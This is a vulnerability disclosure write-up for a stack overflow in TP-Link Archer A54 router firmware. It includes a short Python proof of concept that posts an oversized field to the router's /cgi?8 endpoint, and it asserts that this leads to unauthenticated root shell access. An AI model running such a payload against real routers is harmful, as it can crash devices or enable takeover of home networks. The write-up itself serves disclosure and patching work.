# TP-Link Archer A54 stack overflow

## Overview

- Address of domestic vulnerability database to be submitted：https://www.cnvd.org.cn/
- Manufacturer's website information：https://www.tp-link.com/us/
- Firmware download address ： https://www.tp-link.com/us/support/download/
- Manufacturer's safety feedback address：https://www.tp-link.com/us/press/security-advisory/

## 1. Affected version

![image-20220209181407048](img/image-20220209181407048.png)

Figure 1 latest firmware on the official website

## 2. Recurring vulnerabilities and POC

In order to reproduce the vulnerability, the following steps can be followed:
1. Use the fat simulation firmware archer_ A54v1_ US_ 0.9.1_ 0.2_ up_ boot[210111-rel37983]. bin
2. Attack with the following POC attacks

```
import requests

headers = {
	"Host": "192.168.0.1",
	"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
	"Accept": "*/*",
	"Accept-Language": "en-US,en;q=0.5",
	"Accept-Encoding": "gzip, deflate",
	"Content-Type": "text/plain",
	"Content-Length": "78",
	"Origin": "http://192.168.0.1",
	"Connection": "close",
	"Referer": "http://192.168.0.1/"
}

payload = "a" * 2048
formdata = "[/cgi/auth#0,0,0,0,0,0#0,0,0,0,0,0]0,3\r\nname={}\r\noldPwd=admin\r\npwd=lys123\r\n".format(payload)

url = "http://192.168.0.1/cgi?8"

response = requests.post(url, data=formdata, headers=headers)
print response.text

```

The reproduction results are as follows:

![image-20220209181446694](img/image-20220209181446694.png)

Figure 7 POC attack effect

Finally, you can write exp, which can achieve a very stable effect of obtaining the root shell, and do not need any password to log in and access the router. It is an unauthorized rce vulnerability. (as shown in the figure below, there is no web login)

![image-20220209181502488](img/image-20220209181502488.png)